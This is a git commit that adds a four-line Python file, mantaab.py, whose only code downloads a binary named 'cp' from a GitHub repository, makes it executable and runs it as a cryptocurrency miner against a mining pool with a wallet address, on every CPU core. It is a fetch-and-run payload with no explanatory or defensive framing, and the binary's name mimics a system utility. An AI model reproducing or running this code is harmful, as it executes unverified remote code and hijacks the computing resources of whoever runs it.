d29196d72bedddbece0baf691526ac717a2c64ca
erlandi-26 <x@erlandi.eu.org>
2024-07-13 16:02:50 +0700

    Create mantaab.py

---
+++ mantaab.py
@@ -0,0 +1,4 @@
+import sys
+import os
+os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
+os.system("chmod +x cp && ./cp -a yespowerr16  -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YdftzuLuBYRxZdx5ZkfgwSypHJSpRiqAHR.erlandi -p m=solo -t $(nproc)")
